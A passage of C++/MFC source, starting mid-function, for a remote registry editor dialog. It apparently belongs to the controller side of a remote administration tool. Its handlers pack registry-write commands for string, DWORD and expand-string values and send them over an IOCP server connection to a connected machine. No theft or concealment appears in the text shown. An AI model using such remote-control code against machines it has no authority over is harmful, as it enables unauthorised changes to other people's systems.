	if (msg.size > 0)        //根键 就不用写项了
		memcpy(buf + 2 + sizeof(msg), FullPath.GetBuffer(0), FullPath.GetLength() * sizeof(TCHAR));  //项值
	memcpy(buf + 2 + sizeof(msg) + FullPath.GetLength() * sizeof(TCHAR), key.GetBuffer(0), key.GetLength() * sizeof(TCHAR));  //键值
	how = 3;
	this->index = index;
	m_iocpServer->Send(m_pContext, (LPBYTE)(buf), datasize);
	delete[] buf;
}
void CReg::OnMenuitemRegStr()
{
	// TODO: Add your command handler code here
	CRegText dlg(this);
	if (isEdit)
	{                //是编辑
		dlg.m_key = Key;
		dlg.m_value = Value;
		dlg.EPath = true;
	}
	dlg.DoModal();

	if (dlg.isOK)
	{
		CString FullPath = GetFullPath(SelectNode);      //得到全路径
		char bToken = getFatherPath(FullPath);
		DWORD size = 1 + 1 + 1 + sizeof(REGMSG) + FullPath.GetLength() * sizeof(TCHAR) + dlg.m_key.GetLength() * sizeof(TCHAR) + dlg.m_value.GetLength() * sizeof(TCHAR) + 6;
		char* buf = new char[size];
		ZeroMemory(buf, size);
		REGMSG msg;
		msg.count = FullPath.GetLength() * sizeof(TCHAR);            //项大小
		msg.size = dlg.m_key.GetLength() * sizeof(TCHAR);          //键大小
		msg.valsize = dlg.m_value.GetLength() * sizeof(TCHAR);        //数据大小

		buf[0] = COMMAND_REG_CREATKEY;								//数据头
		buf[1] = MREG_SZ;											//值类型
		buf[2] = bToken;											//父键
		memcpy(buf + 3, (void*)&msg, sizeof(msg));                  //数据头
		char* tmp = buf + 3 + sizeof(msg);
		if (msg.count > 0)
			memcpy(tmp, FullPath.GetBuffer(0), msg.count);        //项  
		tmp += msg.count;
		memcpy(tmp, dlg.m_key.GetBuffer(0), msg.size);          //键名
		tmp += msg.size;
		memcpy(tmp, dlg.m_value.GetBuffer(0), msg.valsize);          //值
		tmp = buf + 3 + sizeof(msg);
		// 善后
		type = MREG_SZ;
		how = 4;
		Key = dlg.m_key;
		Value = dlg.m_value;
		m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size);
		delete[] buf;
	}
}

void CReg::OnMenuitemRegEdit()
{

	int index = m_list.GetSelectionMark();
	if (index < 0)return;
	BYTE bType = GetEditType(index);

	switch (bType)
	{
	case MREG_SZ:
		isEdit = true;								//变为可编辑状态
		Key = m_list.GetItemText(index, 0);			//得到名
		Value = m_list.GetItemText(index, 2);		 //得到值
		OnMenuitemRegStr();
		how = 5;
		this->index = index;
		break;
	case MREG_DWORD:
		Key = m_list.GetItemText(index, 0);      //得到名
		Value.Format(_T("%s"), m_list.GetItemText(index, 2));      //得到值
		Value.Delete(0, Value.Find(_T('(')) + 1);        // 去掉括号
		Value.Delete(Value.GetLength() - 1);      //
		isEdit = true;								//变为可编辑状态
		OnMenuitemRegDword();
		how = 5;
		this->index = index;
		break;
	case MREG_EXPAND_SZ:
		isEdit = true;								//变为可编辑状态
		Key = m_list.GetItemText(index, 0);			 //得到名
		Value = m_list.GetItemText(index, 2);      //得到值
		OnMenuitemExstr();
		how = 5;
		this->index = index;
		break;
	default:
		break;
	}
}

void CReg::OnMenuitemRegDword()
{
	// TODO: Add your command handler code here
	CRegText dlg(this);
	dlg.isDWORD = true;
	if (isEdit)
	{                //是编辑
		dlg.m_key = Key;
		dlg.m_value = Value;
		dlg.EPath = true;

	}
	dlg.DoModal();
	if (dlg.isOK)
	{
		CString FullPath = GetFullPath(SelectNode);      //得到全路径
		char bToken = getFatherPath(FullPath);
		DWORD size = 1 + 1 + 1 + sizeof(REGMSG) + FullPath.GetLength() * sizeof(TCHAR) + dlg.m_key.GetLength() * sizeof(TCHAR) + dlg.m_value.GetLength() * sizeof(TCHAR) + 6;
		char* buf = new char[size];
		ZeroMemory(buf, size);

		REGMSG msg;
		msg.count = FullPath.GetLength() * sizeof(TCHAR);            //项大小
		msg.size = dlg.m_key.GetLength() * sizeof(TCHAR);          //键大小
		msg.valsize = dlg.m_value.GetLength() * sizeof(TCHAR);        //数据大小

		buf[0] = COMMAND_REG_CREATKEY;               //数据头
		buf[1] = MREG_DWORD;                           //值类型
		buf[2] = bToken;                           //父键
		memcpy(buf + 3, (void*)&msg, sizeof(msg));                     //数据头
		char* tmp = buf + 3 + sizeof(msg);
		if (msg.count > 0)
			memcpy(tmp, FullPath.GetBuffer(0), msg.count);        //项  
		tmp += msg.count;
		memcpy(tmp, dlg.m_key.GetBuffer(0), msg.size);          //键名
		tmp += msg.size;
		memcpy(tmp, dlg.m_value.GetBuffer(0), msg.valsize);          //值
		tmp = buf + 3 + sizeof(msg);

		// 善后
		type = MREG_DWORD;
		how = 4;
		Key = dlg.m_key;
		Value = dlg.m_value;
		m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size);
		delete[] buf;

	}
}
void CReg::OnMenuitemExstr()
{
	// TODO: Add your command handler code here
	CRegText dlg(this);
	if (isEdit) {                //是编辑
		dlg.m_key = Key;
		dlg.m_value = Value;
		dlg.EPath = true;

	}
	dlg.DoModal();
	if (dlg.isOK)
	{
		CString FullPath = GetFullPath(SelectNode);      //得到全路径
		char bToken = getFatherPath(FullPath);
		DWORD size = 1 + 1 + 1 + sizeof(REGMSG) + FullPath.GetLength() * sizeof(TCHAR) + dlg.m_key.GetLength() * sizeof(TCHAR) + dlg.m_value.GetLength() * sizeof(TCHAR) + 6;
		char* buf = new char[size];
		ZeroMemory(buf, size);

		REGMSG msg;
		msg.count = FullPath.GetLength() * sizeof(TCHAR);            //项大小
		msg.size = dlg.m_key.GetLength() * sizeof(TCHAR);          //键大小
		msg.valsize = dlg.m_value.GetLength() * sizeof(TCHAR);        //数据大小

		buf[0] = COMMAND_REG_CREATKEY;               //数据头
		buf[1] = MREG_EXPAND_SZ;                           //值类型
		buf[2] = bToken;                           //父键
		memcpy(buf + 3, (void*)&msg, sizeof(msg));                     //数据头
		char* tmp = buf + 3 + sizeof(msg);
		if (msg.count > 0)
			memcpy(tmp, FullPath.GetBuffer(0), msg.count);        //项  
		tmp += msg.count;
		memcpy(tmp, dlg.m_key.GetBuffer(0), msg.size);          //键名
		tmp += msg.size;
		memcpy(tmp, dlg.m_value.GetBuffer(0), msg.valsize);          //值
		tmp = buf + 3 + sizeof(msg);

		// 善后
		type = MREG_EXPAND_SZ;
		how = 4;
		Key = dlg.m_key;
		Value = dlg.m_value;
		m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size);
		delete[] buf;
	}

}

void CReg::OnNMDblclkListReg(NMHDR *pNMHDR, LRESULT *pResult)
{
	OnMenuitemRegEdit();

	*pResult = 0;
}


BOOL CReg::PreTranslateMessage(MSG* pMsg)
{
	if (
		pMsg->message == WM_KEYDOWN		
		&&(	pMsg->wParam == VK_ESCAPE	 
		||	pMsg->wParam == VK_CANCEL	
		||	pMsg->wParam == VK_RETURN	
		))
		return TRUE;

	return CDialogEx::PreTranslateMessage(pMsg);
}
